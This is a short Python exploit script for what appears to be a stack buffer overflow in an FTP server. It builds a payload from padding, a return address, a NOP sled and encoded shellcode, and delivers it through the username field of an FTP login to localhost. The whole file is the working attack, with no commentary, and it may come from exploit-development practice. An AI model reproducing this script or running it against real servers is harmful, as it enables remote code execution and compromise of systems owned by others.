import socket
from ftplib import FTP

buffer = 'A' * 485 + "\xFB\xC3\x35\x76" + '\x90' * 20

buffer+="\xbf\x4d\xd5\x02\xce\xdb\xc0\xd9\x74\x24\xf4\x58\x29\xc9"
buffer+="\xb1\x33\x31\x78\x15\x03\x78\x15\x83\xc0\x04\xe2\xb8\x29"
buffer+="\xea\x47\x42\xd2\xeb\x37\xcb\x37\xda\x65\xaf\x3c\x4f\xba"
buffer+="\xa4\x11\x7c\x31\xe8\x81\xf7\x37\x24\xa5\xb0\xf2\x12\x88"
buffer+="\x41\x33\x9a\x46\x81\x55\x66\x95\xd6\xb5\x57\x56\x2b\xb7"
buffer+="\x90\x8b\xc4\xe5\x49\xc7\x77\x1a\xfe\x95\x4b\x1b\xd0\x91"
buffer+="\xf4\x63\x55\x65\x80\xd9\x54\xb6\x39\x55\x1e\x2e\x31\x31"
buffer+="\xbe\x4f\x96\x21\x82\x06\x93\x92\x71\x99\x75\xeb\x7a\xab"
buffer+="\xb9\xa0\x45\x03\x34\xb8\x82\xa4\xa7\xcf\xf8\xd6\x5a\xc8"
buffer+="\x3b\xa4\x80\x5d\xd9\x0e\x42\xc5\x39\xae\x87\x90\xca\xbc"
buffer+="\x6c\xd6\x94\xa0\x73\x3b\xaf\xdd\xf8\xba\x7f\x54\xba\x98"
buffer+="\x5b\x3c\x18\x80\xfa\x98\xcf\xbd\x1c\x44\xaf\x1b\x57\x67"
buffer+="\xa4\x1a\x3a\xe2\x3b\xae\x41\x4b\x3b\xb0\x49\xfc\x54\x81"
buffer+="\xc2\x93\x23\x1e\x01\xd0\xdc\x54\x0b\x71\x75\x31\xde\xc3"
buffer+="\x18\xc2\x35\x07\x25\x41\xbf\xf8\xd2\x59\xca\xfd\x9f\xdd"
buffer+="\x27\x8c\xb0\x8b\x47\x23\xb0\x99\x24\xae\x2a\x02\x85\x5b"
buffer+="\x93\x21\xb8\xf7\xb0\xa5"

ftp = FTP('127.0.0.1')
ftp.login(buffer, 'aaa')